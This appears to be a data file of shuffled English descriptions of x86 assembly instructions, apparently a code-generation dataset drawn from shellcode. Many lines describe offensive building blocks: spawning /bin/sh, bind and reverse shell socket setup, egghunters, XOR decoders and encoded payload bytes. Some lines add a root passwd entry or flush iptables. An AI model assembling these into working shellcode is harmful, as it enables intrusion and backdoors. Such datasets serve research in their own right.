move esp into ebp
push the 4 bytes at address var2 onto the stack
push 0x742f3a31 onto the stack
load ecx contents into edi register
save the new socket fd into ecx
jump to the label l3 if the unsigned contents of the cl register is lower than the unsigned contents of the dl register
right rotate bl by the contents of cl
push eax,ecx and ebx contents on stack
if the contents of the eax register is not equal to the contents of the ebp register then jump short to the memory location loc_40102B
add one to the doubleword integer stored at memory location value
load the stack pointer in ecx register
load __nr_close syscall into al register
push the doubleword ebx to the stack
load __nr_execve syscall into al register
system call write
system call getppid
declare _dopcount label
jump to the xordecode label if the contents of the bl register is equal to the value 0xbb else jump to the notdecode label
call kernel / run connect syscall
clear eax and execute exit syscall
jump to the exit label if the contents of the eax register is equal to the contents of the ebx register
left rotate the edi register 1 time
define the byte string '/proc/sys/kernel/randomize_va_spacex'
jump to dupcount if cx is less than or equal to 2 with sign
subtract 0x10 from eax
if the unsigned contents of the cl register is lower than the unsigned contents of the dl register then jump to the label l3
perform an unconditional short jump to _cmd label
decrement ecx content
load ip address 127.0.0.1 (hex) as a byte into edx register then push it onto the stack
clear direction flag increasing si and di index registers.
push 0x622f7273 to the stack
if the contents of the cl register is equal to the contents of the dl register then jump to the init label else increment the contents of the cl register
add 0x4 from the byte at the address edi and negate the result
move the 4 bytes of data at address esi+4*ebx into edx
load socketcall syscall number into eax register
set the eax register to null
set the offset bytes to point at the end of the program
push the byte 17h onto the stack
push the value 0x6e69622f and the value 0x7273752f onto the stack and point the ecx register to the stack register
if the doubleword starting at the address [eax-8] is not equal to the contents stored at the egg address then jump to the _next label
load the effective address [esi+15] into ebx
push the byte 0x04 onto the stack
exchange ecx with eax content
exchange the contents of the ebx register with the contents of the eax register
push bx content on the stack
define S4 as the array of words 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80
call near stageaddress
push the 0x7372656f onto the stack
define F4 and call the function function_4
waitpid
move ebx into the address [esi+39]
declare the priv_setgid label
zero out [ecx+4]
declare of the global _start
increment eax by 1
push double word 0x39396e2d onto the stack and point the edi register to the stack register
increment ebx content deining the argument sys_acccept = 5
move n to edx
not_equal label
call jmp_search
concatenate the content of eax, edi, esi, ebx and load them into ecx register
zero out ecx register
push the byte 67 onto the stack
oring hexadecimal value 0xfff with dx register
push the contents of the ebx register onto the stack and point ecx to the stack register
push the value 0x7461632f and the value 0x6e69622f onto the stack and point the esi register to the stack register
copy open syscall numebr into eax register
move 02001 into cx
declare three doublewords of memory starting at address z and initialized to 1 2 and 3
in the function F1 point to the next byte in esi
jump short to the function call_decoder
shift right ax by the contents of cl and negate the word in ax
define _decoder_label
move 1+0feh into dl
jump to the reading label
jump to the Next_Cycle label if the result of the logical xor between the dl register and the value 0xBB is zero
create label main_inc
put the syscall 0x4 into the eax register
jump to loop_label if the sign flag is clear
reset both lower and uppper bytes of ecx to be 0
add the value 3 to the content of ebx register
copy execve syscall number into al register
jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
move the contents of the edx register into the ecx register
shift left esi register bits 1 time with zeroes shifted in on right
jump to even_numer if greater
load the effective address of the result of the operation [esi + 13] into the edi register
jump to the label l3 if the contents of the dl register is greater than or equal to the decimal value 27
push the string 'b3mb4m.github.io//exec/h' on stack as chained double words
push -vzn parameter on the stack
push the byte 0x01 to the stack
call the _continue function
point to the next byte in eax
push the contents of the edx register onto the stack and point eax to the stack register
save pointer (esp) to socket() args (ecx)
load hexadecimal value 0x2bc into cx register
define enc_label
push 0x31373737 onto the stack
move hexstr into ecx
load hexadecimal value 0x50905091 as a double word into ebx register then decrement its content by 1
move 0x563a1f3e into esi
push ascii nib/ onto stack
point to the next byte of the shellcode
if the contents of the eax register is zero then jump to the label ready_to_proxy
declare global _start, section .text, _start label
transfer the value 10 to the al register
load execve syscall nimber into al register
call the set_argv function
execute execv syscall
make the system call write
push the size of sockaddr_in6 = 28 on stac
move /bin/sh into eax
load the string //bin/sh on the register ebx
load esp content in edi register
load the system call socketcall in al register
declare function_3 and call it
push ecx content, the value 0x2 two times on stack
define _exec label
if the contents of the cl register is greater than or equal to the decimal value 12 then jump to the label l2
push the double word 2 onto the stack
load edx, esi, ebp and ebx contentsinto ecx register
pick up ebx from stack
define dim to be 512 bytes large
if the doubleword starting at the address contained in the eax register is not equal to the contents of the ebx regoster then jump to the next_address label else jump to the eax register
push af_inet = 2
setting the socketcall type to sys_socket
pop 3 into ecx for counter
move the contents of the si register at the memory location specified by the operation [bp+0x32]
execve
push byte 1 onto the stack
define a byte and initialize it to 0xcd
delcare call_shellcode_label
call my_subroutine
save egg signature altered: 0x50905090 – 1 into ebx
move the 16-bit integer representation of 2 into the 2 bytes starting at address ecx
load hexadecimal value 0x14 on edx register
set bind =2
jump short to the setup label
subtract the value at location esi from the value a location edi without saving results. update flags based on the subtraction and the index registers esi and edi.
load the address of the string that is on the stack into rsi
put the string /sbin/reboot on the stack through eax register then clear it
jump to _loop label if the sign flag is clear
push the doubleword 0x73656c62 to the stack
load 0 into edi register
store sock_file_des in ebx register
perform the xor operation between the value stored at the location ecx and dh
add esi into memory address ebp-4
make the system call to install the signal handler
move the hexadecimal value 11 in al register
move 66h into al
define the exit label
terminate string, str[7] = null
declare the loopinghere label
pop the value on the stack back into dx
push the dword 0x214c4f4c onto the stack
multiply eax by edx
specify file descriptor 2 standard error
if the contents of the eax register is zero then jump to the label proc_name
move 13 into edx
clear edx and push it on the stack
add 0x2 to ebp
make the system call to create a new process
perform a short unconditional jump to _shellcode label
store socket descriptor into esi register
jump to the retry label if the contents of the eax register is not equal to the contents of the ebx register
move 0x3 into cl
clear eax, then execute exit syscall
move starting address of array to ecx
push 0x68737a2f onto the stack
push the dword 0x10 onto the stack
decode function
move 16 into al
left rotate the byte at the address esi by 0x2 bits
move the byte starting at the address [esi + eax + 1] into the bl register
make room on the stack for local variable
system call interrupt 0x80
move to the next double word in the ecx register
jump to loop if not equal to zero
swap the values si ebx and bx registers
push 00 onto the stack
clear eax and ebx registers
define the size of inet_address = 16 (hex)
move the dup2 syscall into al register
copy esi content into cx register
subtract the contents of the ecx register from the contents of the ecx register
reset ebx to 0
push the 0x68732f6e onto the stack
move espaddress to ecx
point edi to the next byte of the shellcode
place the address of var in eax
define the _close label
load dup2 syscall into al register and call kernel
if the contents of the eax register is not zero then jump to the label _parent else restore the top of the stack into the ecx register
move the byte at the address [esi+ecx+1] into bl
push the 0x682d onto the stack
allocate a single byte of memory and initialize it to the letter 'c'
jump to the exit label if the contents of the eax register is equal to the contents of the ebx register else move the value 0x4 into the al register
push the address of file: db "/sbin/iptables#-f" on the top of the stack, and then change the eip to the address in code_label
compare 1h and dl content and go to _exit if flag zero is set
define the byte string '/etc/passwd#'
push af_inet on the stack
load byte 0x1 into esi
push 0x3 into bl register
move 5 into ebx
ecx point to the structure
put the syscall 49 into the eax register
transfer file descriptor to edi
call the write function
call the shell_ret function
get 9 in the ax
push the value 0x7461632f and the value 0x6e69622f onto the stack and point the edi register to the stack register
push the 0x6 value onto the stack
define decoder_value as an array of the following bytes: 0x7d, 0x7d, 0x7d, 0x7d, 0x7d, 0x7d, 0x7d, 0x7d
move the stack pointer into edx
move to the next byte increasing esi by 1
shellcode on esi
move the memeory location of the args to ecx
move the address of esi-1 into dl
declare section .data
decrement the counter and jump to the do_dup label if the count is not zero
move esi into ecx
move remainder into esi
load address of the encoded shellcode into esi
push the byte +0x1 onto the stack
move n to ebx
move the byte in esi into bl
push the double word 0x0a206873 onto the stack
push the value 0x61702f2f and the value 0x6374652f onto the stack and point the esi register to the stack register
shift right all bits of ecx 0x8 times
push the word 0x4255 onto the stack
subtract 5e5d7722 from the contents of the eax register
exchange ebx with edx content
declare message_label
define call_decoder and call decoder function
allocate one byte of memory for a_letter variable and initialize it to 'd'
jump short to decode if not zero
move 10000h into eax register
move 6 into al
declare global _start, section .text, _start label
push the double word 0x303a3a31 onto the stack
push null two times on stack
move 0xdeadc0de into eax
push &serv_addr saved in ecx
push 0x6567772f onto the stack
move 70 into al
move bl into the byte defined by the address esi + eax
move the remainder into eax
move the first element in array2 into ecx
put /bin/sh into the ecx register
push null into stack
move al into cl
load __nr_dup2 into al register
saving sockfd
move the contents of the esi register into the al register
put the syscall 0x04 into the eax register
pop the next argument off the stack into eax
push the word ax onto the stack
add 2 to bl content
preserve esi on the stack
load the value of ebx+0xff into register ecx
copy the contents of ebx into eax register
put the syscall 0x3 into the eax register
ebx point to pushed string
move parentmsg into eax
move 077o into cl
define _entrypoint label
move 0x9a8dd091 into eax
perform or operation between dx and 0xfff and save the result into dx
perform and operation on the variable mask1 and 128
move 0x1f into al
put the syscall 6 into the eax register
perform a short unconditional jump to _cmd label
move the address of message string into ecx
restore the original value of eax
save edx content into ebx
put /bin/sh into ebx
call the _build function
add 4 to eax
restore the top of the stack into the ecx register then decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else make the system call exit
put the syscall 0x2e into the eax register
move the contents of the al register at the memory location specified by the operation [bp+0x07]
perform the xor operation between the contents of the ax register and the value 0x7777
load eax content into ebx
mul eax by ebx
move decimal number 90 into eax
declare an uninitialized word labeled x
push ecx(struct pointer) onto the stack
move the 4 bytes in memory at the address contained in ebx into eax
store 78 decimal into edx
push eax and ebx contents on stack
declare _execfile label
allocate memory for a null terminated string 'hello\n'
define the byte 0xcd
push the value 0x4c4c4128 onto the stack
multiply the value of eax by 2
push the word cx onto the stack
push the value 0x64687373 onto the stack and point the esi register to the stack register
move 0x5 into al
jump to decode
fork
define encodedshellcode_label
right rotate esi 1 time
move the byte at the address esi+eax*1 into bl
subtract 0x44444444 from edi and save the result in edi
push 'ib//'
pick up ecx from stack
put the byte my_value into the eax register
push the value 0x6475732f and the value 0x6374652f onto the stack and point the ebx register to the stack register
initialize edx with the decimal value 0
push the value 0x7461632f and the value 0x6e69622f onto the stack and point the ebx register to the stack register
clear eax register
move /bin/sh into the eax register
jump short to cycle
pop the address of the encoded shellcode into esi
define shellcode_length equal to the size of shellcode
copy esi content into ax register
return
specify sys_write call
0's out ebx
xoring eax with ebx
move the contents at memory address temp1 to eax
compare the contents of eax and the contents of ebx
push the value 0x2f2f2f2f onto the stack and point edi to the stack register
define the size of the shellcode = 25 byte
preserve eax on the stack
if the byte starting at the address contained in the esi register is lower than the byte value 0x7 then jump to the lowbound label
mul eax by edx
in the function F3 negate al and move al to the next byte
swap the values of esi and eax
clear ebx and move 0x4 in the lowest byte of the register
create label main_push
jump to nextarg label
if the doubleword starting at the address [eax-4] is equal to the contents stored at the egg2 address then jump to the _next label else jump to the eax register
define here label
move bx to count
define _createfile label
put the syscall 0x01 into the eax register
define the array of bytes shellcode and initialize it to vl43ck:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:vl43ck:/tmp:/bin/bash
load the effective address of esi into the ebx register
push esi onto the stack
push the dword [ebp+16] onto the stack
move value at top of the stack to ebx
push socket_type = sock_stream, 1, on stack
clear ebx
load the effective address of the result of the operation [esp +1] into the ebx register
load execve syscall number into eax reegisster
set flag o_wronly and o_append
push 0x6962732f onto the stack
define egg equal to 'egg '
push the sock_reg onto the stack
in the function F1 jump to label L1 if the current byte of the shellcode is lower than 0x1 else subtract 0x1 from the byte of the shellcode and jump to L2
put 0 in ecx
push the word 0x1b6 onto the stack
push the dword 0x7461632f onto the stack
push the contents of the esi register onto the stack and point ebx to the stack register
push port number 4444 as a word
define msg variable and initialize with 'i love you!'
move the address of fizz string into eax
go to prepare after storing string ',ajm,pk#########' on the stack
decode_loop
go to _zeroc label
move ch into the byte in esp+eax
save the pointer to socket args into ecx register
swap the contents of the eax register with the contents of the ecx register
overwriting edx with either 0
remove last character from the stack into eax
remove last character from the stack into ebx
xoring al content with 0xe9
set cl to the fd of stdout = 1
swap the contents of the ecx register with the contents of the edx register
move the deciaml value 132 in dx register
negate all the bits of dl register
if the contents of the dl register is equal to the vale 1 then jump to the exit label else jump to the reading label
load _nr_socket into ax register
push serv_addr saved in ecx
put the syscall 0xb into the eax register
push the byte 0x2e onto the stack
move the byte in eax into bl
replaces the contents of the ebx register with its two's complement
push edx and the value 0x30 onto the stack
load null byte on the stack
push the double word 0x2f3a2f3a onto the stack
push the word 0x632d onto the stack and point the ecx register to the stack register
jump short to the function decode
getpgrp
move the byte at the memory location specified by the operation [esi+1+ebp] into al
esi point to next instruction in the encoded shellcode
divide ebx by 4 using right shift
fix egg signature in ebx adding 1
add 0xa to the al register
decoder routine
store address of /usr/bin/ncat into ebx register
if the contents of the bl register is less than the value 78h then jump to the memory location loc_402B1D
push null string terminator on stack
define _zero1d label
negate all the bits of the esi register
move the contents of memory address ebx+esi into eax
load the contents of esi into edi
transfer eax content into esi register
load the string sshd:$1$.ex412qg$mdsbhdprjsx39hek0zlju0:1111:1111:/tmp:/bin/sh on ebp register
subtract the decimal value 48 from the nl register
check if [edi] == eax then increment edi while
point to the next byte of the encoded shellcode
push the byte +0x66 onto the stack
declare the dup2 label
move hexadecimal value 0x34399797 into esi content
put address of string -> ebx
move the function chmod in al register
if zero jump to decoded_shellcode
push the byte 28 to the stack
push 0xa to the stack
define download function
system call mmap
push esi, edi and edx content on stack
move the contents of the esi register into the long starting at the address [esi+18]
define the _socket label
ebx points to the top of the stack
define msg as the byte string 'we found the egg!'
move 1 into bl
push the byte +0xb onto the stack
pushe all general purpose registers onto the stack in the following order: (e)ax, (e)cx, (e)dx, (e)bx, (e)sp, (e)bp, (e)si, (e)di. the value of sp is the value before the actual push of sp.
subtract the contents of the edx register from the contents of the edx register
push esp to the stack
save 'egg' into edx register
push the string “/bin//sh” on stack
define decode label
move ASCII /bin/sh into ebx
decrement the al register and jump to shellcode if the result is zero
subtract 1 from the contents of the cl register
move bl into the byte in esp+eax+3
define _decoded_shellcode label
define the closefile label
define word2 signed word and initialize it to -32768
define the byte string '/sbin/ipchains#-f#'
move the syscall bind in bl register
point edx to the start of the shellcode
invoke sys_time
move 0x07 into the byte at address [esp+2]
push the dword 0x68732f6e onto the stack
jump short to the callit label
xoring cl content with the byte contained into esi register
push edx, edi and ebx content on stack
move the contents of the al register at the memory location specified by the operation [bp+0x31]
push the 0x30317974 onto the stack
move 83 into the byte at address al
make the system call to get information about the file
move name into ebx
push the value of port 1336 as a word on stack
move 0xe2 into bh
load execve in eax
move esi into the doubleword starting at the address esp-4
call the function in esi
subtract the contents of bx from the contents of dx
go to egghunter
push the parameter “c-“ as a word on stack
move 0x1a4 into dx
move al into the byte at address [ebx + 35]
move the byte at the address [esi + 1] into dl
move 0x65636170 into esi
if the contents of the eax register is zero then jump short to the memory location loc_402C13
get process group
increment esi two times and edi once
push the byte 0x11 onto the stack and point ebx to the stack register
declare message string msg1 containing 'hello brave new world!'
save the byte in esi+edx+4 in ch
ecx point to the top of he stack
copy ecx content as a double word into memory space at the address esp-4
push zero onto the stack
loop while zero flag not set
jump short to _star label
zero out the eax register and the ecx register
compare the byte pointed to by eax at this address against zero
define _call_decoder label
move edx into edi
point to the next byte in esi
transfer stack pointer into ebx register
zero out eax register
jump to the child label if the zero flag is set
jump to the loop label if the contents of the cl register is not equal to the value 0x3
load the string /etc/passwd in abx register
jump to the memory address 0x8 if the contents of the edx register is equal to the contents of the ebx register else move the contents of the edx register into the ebx register
declare function_2 and execute it
add the contents of the esi register to the contents of eax register
place address buff into esi
declare decoder2_label
push the value of local ip = 192.168.1.5 on stack
jump short to the call_write label
save the byte 2 into al register
file descriptor 1 standard output
move the byte at the address 3h into al
push the value 0x6e7a762d onto the stack and point the esi register to the stack register
push the byte 0x10 onto the stack
jump to label continue if equal
in the function F5 jump to label L1 if the byte at the address in esi is greater than 0x2 else add 0x2 to the byte at the address in esi and jump to L2
if equal then jump to label l7
move the contents of al into the byte at the memory location specified by the operation [esi+17]
push eax content on the stack 2 times
move 0x2 into dl
set read-write permission for the owner of the file, and read permission for everyone else
push the contents of esi register onto the stack
set syscall execve
pick up esi register that contains the string in db
define function_4 and call it
move 0x8 into bl
subtract shellcode byte value to dl = 13
load the value of sys_accept=5 on stack
move the value 0x2a1 into the dx register
move 0x4 into ebx
load the strinf //bin/sh in ebx register
compare value at location edi with eax register
push 0x636e2f2f onto the stack
push esp content on stack
copy esi content as a double word into memory sapce at the address esp-4
declare L4 and jump to the shellcode
declare the path label
push the contents of the ebx register onto the stack and point eax to the stack register
move eax into edx
mask out lowest 4 bits of the eax register
set the socketcall type to sys_bind
declare 4 bytes starting at the address str initialized to the ascii character values for the string 'hey' and 0 respectively
restore eax from the value we pushed onto the stack at the start
initialize edx with the hexadecimal value 0x0
jump to the label check_html if the contents of the eax register is zero
in D1 save the shellcode in esi and move it to edi
compare ecx content with the marker, then decrement ecx by 1 and if cx != 0 and the zero flag is clear go to _next else go to ecx address
define shellcode as array of the bytes 0xf1,0x31,0x90,0x38,0x47,0x47,0x5c,0x1b,0x1b,0x47,0x4d,0x0b,0x07,0xe7,0x6a,0xb3,0xd9,0x6b,0xb1,0xda,0x68,0x51,0xbb,0xc6,0x4d
push the byte 3 onto the stack and point ebx to the stack register
push 'osts' on stack
declare a doubleword at address y initialized to contain 3000
go to _shellcode label after entering the byte string 'mt.txtx' address on the top of the stack
pick up _ecx label from the satck
increment edi content
add 0x2d383638 to the contents in eax and save the result in eax
push 0x32322e32 onto the stack
move the contents of the address stored in esi into the bx register
push the word 0x632d onto the stack and point the edx register to the stack register
define decode function and subtract 13 from the current byte of the shellcode
save the effective address of my_table in ebx
push null termination string and the string '/usr/sbin/setenforce' on the stack
push the word 2 onto the stack
load address of the parameter array
define call_shellcode label
push the dword 0x61702f63 onto the stack
jump to the next_cycle label if the zero flag is set
divide ecx by 4 using right shift
swap the contents of the eax register with the contents of the ebx register
define decoder
move the contents of dl into the next byte of the shellcode
push the address of encodedshellcode on the top of the stack, and then change the eip to the address in _shellcode label
mv new stack ptr to ecx
specify sys_write syscall
push the contents of the eax register onto the stack and point ecx to the stack register
jump to the exit label if the contents of the dl register is equal to the vale 1 else jump to the reading label
push the ebx value to the stack
push the value 0x6374652f onto the stack and point ecx to the stack register
jump to the call_decoded label if the result of the logical xor between the ax register and the bx register is zero
execute open
increment the address in eax by one byte
declare the execute label
load __nr_alarm into al register
move the contents of the ebp register ino the esp register
pop the last element pushed onto the stack into ax
jump to the memory address 0x8 if the contents of the edx register is equal to the contents of the ebx register
mov the value 0x3b30 into the cx register
push the contents of the ebx register onto the stack
push the byte 11 to the stack
loop decode
move the value 0x656e7265 into the double word starting at the address [esp-0x1c]
put 5 in bl register
jump to the connect label if the operands of the above comparison are equals
define the _parent_read label
define call_decoder and call decoder
moves syscall for socketcall into ax
if the contents of the al register is greater than the decimal value 9 then jump to the label l1
place the value ebx+4*esi in edi
add 0x33333333 value to esi
shellcode address in esi
move a byte from al into memory address hexstr+edx+2
jump to loop_label if flag zero is equal to 0
move the value of ecx into eax
define the _random label
jump to the L1 label if the contents of the dx register is equal to the value 0x03e8
move the contents of the address [ebp-8] into the ebx register
load '/etc//passwd' and null teminating string into ecx register
push the hexdadecimal value of 4444 on the stack
push the byte 0x5 onto the stack and point ebx to the stack register
make the system call kill
define the byte string '0b8h'
make esi point to next 8bytes of "shellcode"
define name as the byte string '/bin/sh'
zero out the ecx register and move 23 into the lower byte of the register
perform a logical xor between the bx register and the ax register and save the result in ax
push the word 0x662d onto the stack and point the ecx register to the stack register
move 0x222933f0 into esi
subtract the value 0x9 from the current byte of the shellcode and then negate the result
move syscalll exit in a reegister
define _four label
make execve() syscall or 11
subtract 0x13 from the al register
load exit in al register
push the byte 0x7 onto the stack and point edx to the stack register
perform a logical xor between the ecx register and the bh register and save the result in ecx
define decode_pr label
push sys_execve onto the stack
in call_shellcode call the decoder function
point edi to stack
push ebx(0) onto stack (ipproto_ip = 0)
add the contents of the local variable stored at ebp-4 into eax
push the byte 16 onto the stack
push the word 0x0a to the stack
compare the byte in esi with 0x7
push edx onto the stack
go to _zerob label
get the command string to write in the file, 3rd arg
load __nr_dup2 into al register
decrement the ecx register and jump to the L3 label if the contents of the ecx register is not zero and the zero flag is zero else move the value 7 into the edx register
push double word 0x39396e2d onto the stack and point the ebp register to the stack register
add 4 to the contents of the esi register
convert signed dword in eax to a signed quad word in edx:eax
add the hexadecimal value 0x66 to al register
copy 1 in al
push the word 0544o onto the stack
load the effective address of ebp-8 into the ebx register
perform an unconditional short jump to _switch label
push pot number 47138 as a word on stack
decode current byte
move value the contents of memory address ebp+16 into edi
define _encoded label
if the contents of the eax register is not zero then jump to the label do_next_accept
negate all bits in the byte at the memory location var
push the value 0x64687373 onto the stack and point the ebx register to the stack register
increment eax content by 1
push the value 0x2f2f2f2f onto the stack and point eax to the stack register
put the offset of hello in ecx
move 1666 into bx
load 1 into cl register
jump to decoder label after entering the double word string encoded '0x04, 0x539, 0x9d9, 0x6c9, 0xfc9, 0xc49, 0xc29, 0x839, 0xdf9, 0xc49, 0xc49, 0x839, 0x839, 0xce9, 0xc59, 0x259, 0x4f9, 0xfc9, 0x259, 0x4e9, 0xff9, 0x259, 0x4d9, 0x1c9, 0xa79, 0x619, 0x2c9, 0x539' on stack
go to next memory address increasing eax, then check if the egg is at that memory address. if yes set zf = 1 and go to eax. else zf = 0 and go to next_addr label
define connect function
load esp content into edx register
subtract the contents of the bl register from the contents of the cl register and jump to the l3 label if the result is not negative
zero out the eax register and push zero onto the stack
declare 6 bytes starting at the address str initialized to the ascii character values for hello and the null byte
move the contents of the esi register into the cx register
load eax two times, ecx and ebx into ecx register
move the byte at the address 0x1 into al
create a new process
define the decoder function
define L1 label and jump short to L2
perform an unconditional short jump to _encodedshellcode label
jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0xD
if the contents of the eax register is not zero then jump to the label _recv_http_request else subtract the value 0x6 from the contents of the ecx register
push the hexadecimal value 10 and ecx content on the stack.
load the address esi+0xc into ecx register
shift right all bits of ecx 0x10 times
execute no operation
execute shell using execve syscall
declare section containing code
push 216 value to the stack
make the syscall
push the doubleword eax to the stack
push inaddr_any = 0
move 2 into the single byte at the address stored in ebx
push 0x2f656c2d onto the stack
push 0x32322e32 to the stack
move the byte at the address [eax] into dl
declare global _start, section .text and_start label
declare D1 and move the current byte of the shellcode in the dl register
move 16666 into dx
push 0x69622f2f to the stack
increment dx by one
cause both eax and edx to become zero
decrement the counter and jump to decode routine if it is not zero else jump to shellcode label
run xor operation between al register and the hexadecimal values 0x4a and 0x41
load the effective address of the operation [bp+di+0x3e] into the dx register
jump to get_key label
perform and operation between eax and 3f465456 and save the result in eax
push the byte 1 to the stack
value 0x2 is pushed onto stack (af_inet=2)
jump short to the stage label
increment the memory variable count
declare the four label
move 0x2f766564 into eax
decrease the counter and jump to check_even_odd if not zero else jump short to shellcode
load socketcall sycall into al register
declare the stage label
push the value 0x6374652f onto the stack and point eax to the stack register
call the one function
define message as the byte string '/bin/sh'
decrement the bl register and jump to L1 if the result is not zero
clear the counter and move 0x1e into the first byte of the register
swap the address [ebp+16] with the contents of the ecx register
point edx to the next byte of the shellcode
multiply eax by 4 using left shift
move the value close_syscall to al register
move the hexadecimal value 0xb01 to dx register
move 0x0b into the byte at address al
compare the dx value with zero
move cl into the byte in esp+eax+1
push the byte 6 onto the stack
push 0x5000 onto stack port
jump to label done if below or equal
jump short to get_shellcode_addr
move 0xfff into cx
define the program entry point
put syscall execve code in al register
push eax, edx, esi, ebx contents on the stack
address of string -> esi
divide eax by 4 using right shift
shellcode is array of bytes 0xbb,0xec,0x73,0xcc,0x3f,0x9d,0xbb,0x8d,0x51,0xbb,0xb5,0x1b,0xbb,0xb3,0x22,0xbb,0xf2,0x79,0xbb,0xae,0x8e,0xbb,0xb5,0x61,0xbb,0xb5,0x3d,0xbb,0xf2,0x6e,0xbb,0xf2,0x9f,0xbb,0xbf,0x10,0xbb,0xb4,0x89,0xcc,0x76,0x2d,0xcc,0x1c,0x2f,0xbb,0x8d,0x91,0xcc,0x76,0x7e,0xcc,0x1d,0x92,0xbb,0x8e,0x80,0xcc,0x76,0x7b,0xcc,0x1e,0xa7,0xcc,0x4f,0x7f,0xbb,0xd6,0x2b,0xcc,0x32,0x24,0xcc,0x7f,0x37,0xaa
push 2 onto the stack
load chmod syscall number into eax register
jump to the exit label if the zero flag is set
move the value in ecx into eax
jump to label write if below
load chmod syscall into eax register
load the effective address of the operation bp+0x0b] into the bx register
exchange eax contet with ebx content
move 0x2e into the byte in esp
allocate memory for local variables
push 0x5 onto the stack
jump short to the three label
push ebx on stack, increment its content by1 and push it again on stack
save len into edx registe
point to the next encoded_shellcode word
put the syscall 5 into the eax register
call the function decoder
make the system call to write to the file
replace last double word with null
add the value 0x9 from the current byte of the shellcode and then negate the result
make the system call sigaction
define the function D2 and negate the byte in esi
move the 4 bytes of data at address esi+4*eax into ecx
shift right 24 of eax
jump short to the cycle label
move eax into the address [ecx+4]
declare the function D3, store the shellcode in edi and move the pointer into esi
clear eax and push it on the stack
make the systemcall socketcall
right shift the contents of ebx by 31 bits
define the queueliit = 2 and push it on stack
push the value 12 onto the stack and point ebx to the stack register
load __nr_execve syscall number into al register
move bl into the byte in edi and negate the result
zero out the ecx register
push null on stack
perform a short unconditional jump to call_shellcode label
divide the contents of in eax by by the word value stored at memory location var
move the byte at the address 3fh into al
load the the stack pointer in esi register
clear ecx, ebx and eax
jump to the _while_loop label
push the word 0x736e onto the stack
push edi content
clear zero_reg
move 884021143 into edi
increment to the next byte of the shellcode
declare _call_decoder label
copy eax to esi content
push the dword 0x68732f63 onto the stack
moving the pointer to "/bin//sh" to ecx
perform xor operation between eax and eax
push edx content as a word on stack
save shellcode_lenght = 25 into cl register
reserve 64 bytes for buffer
push the value 0x1 onto the stack
jump to the download label if the contents of the eax register is equal to the contents of the ebx register
move to next byte in esi
move the address of environment variable into edx
move stack pointer to ecx
jump to the one label
perform a short unconditional jmp to _file label
load the effective address of the result of the operation [esi+23] into the ebx register
jump to connec
define insertion_decoder label
copy hexadecimal value 0xfeffff80 into eax register
variable for the lenght of the encoded shellcode
decrement the ecx register and jump to the next2 label if the contents of the ecx register is not zero and the zero flag is zero else jump to the edi register
if the carry flag or the zero flag are set go to __bss_start+0x12
zero out ebx
not operation of current byte in esi
jump short to the _load_data label
push zero_reg onto the stack
copy the value 3 into al register
copy the execve syscall numebr in al regisster
push 0x4 onto the stack
jump to the formatting label if the zero flag is set
move the contents of bl into bh
zero out eax and ecx
move linefeed character into eax
store 10 into bl register
call the code function
zero out dddd
pop the top of the stack into the edx register
load the effective address of the result of the operation [esi+18] into the ecx register
define F2 function and jump to L3
push the 0x31373737 onto the stack
save execve command in al register
divide ecx by 2 using right shift
jump to xordecode if bl is equal to 0xbb else jump to notdecode
move 0x0a into al
value in ebx=1 is pushed in to the stack (sock_stream =1)
add 0x2 to the contents in bl and save the result in bl
load __nr_open syscall into eax register
load hexadecimal value 0x776f6490 into ebx register
store the shellcode pointer to esi
push 0x68736164 onto the stack
push sin6_port 2 byte (port 1472) on stack
push the 0x697a onto the stack
jump to label read
move 0x969d8cd0 into eax
push 'k/st' label
call writestring
increment the byte at the address [esp+ecx] by one
call the two function
move 0x01 into al
declare F4 and jump short to F5
move the memory address of buffer variable into eax
move the byte 2h into al
push ecx on the stack and then place pointer to edx
move the byte 3fh into al
load eax into edx register
subtract al from dl and jump to decode_pr if the sign flag is zero
decrement ecx and jumps to the Label1 label if the contents of the ecx register is not zero and the zero flag is equal to zero
increase eax content by 1
null terminate -e/bin/bash
zero out the edx register and jump to the l2 label if the contents of the ecx register is not equal to the contents of the edx register
subtract one from the contents of ebx
push the value 0x6374652f onto the stack and point ebp to the stack register
move the byte at the address 66h into al
save /bin//sh in ebx register
move esp into ecx
call the _printf function
copy esi content into esi register
make the system call waitpid
increment ebx content and puh it on the stack
pop the value on the stack back into esi
right rotate the contents of the esi register by 1 bit
push 0x66 to the stack
jump to the _start label if the contents of the al register is equal to the value 0xf2
add 30 to the single byte stored at memory address var
push the word 0xc005 to the stack
jump to the label l2 if the contents of the cl register is greater than the decimal value 12
overwrite the "shellcode" with previous results
shift encoded_shellcode to right by one bit, one word at a time
push 0x74 to the stack
if the contents of the eax register is not equal to the contents of the edi register then jump to the infinite label
push 0x6168732f to the stack
jump to the l1 label if the unsigned contents of the ecx register is greater than the unsigned contents of the edx register
copy eax into edx
define the byte string '60h'
jump to next label if the destination is greater than the source in the above comparison
push the word 0xaaaa onto the stack
move 0x2e323931 into eax
check if reached the end of shellcode comparing cl with al register. if not return to _decode label else go to _shellcode label
put the syscall 0x17 into the eax register
subtract 1662 from ax and save the result into ax
restore ebp register
define prcess_shellcode label
decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else move the contents of the esp register into the ebx register
push the dword 0x6962732f onto the stack
copy edi content into the memory space at the address esp-0x4
load the effective address of the result of the operation [ebp+24] into the ebx register
go to _zerof label
define sys_socket by increasing ebx by 1
go to _loop label if flag zero is not set
push the value 0x0a4c4c41 onto the stack
add 0xb to the al register
load esi content into esi register
load eax, edi, esi, ebx contents into ecx register
jump to decoder label after saving encoded_shellcode ' dw 0x545, 0x4a3, 0x583, 0x5d3, 0x541, 0x541, 0x439, 0x5d3, 0x5d3, 0x541, 0x5e7, 0x5d5, 0x5cf, 0x411, 0x4eb, 0x443, 0x509, 0x48d, 0x423, 0x539' pointer to esi
save esp content into ecx register
move 0xfeffff80 into eax
make the system call read
jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than the byte value 0xD
make the system call fork
pusg protocol = 0, sock_stream = 1 and af_inter = 2 on stack
move shellcode_length into cl
if the contents of the eax register is zero then jump to the label socket
push the ecx onto the stack
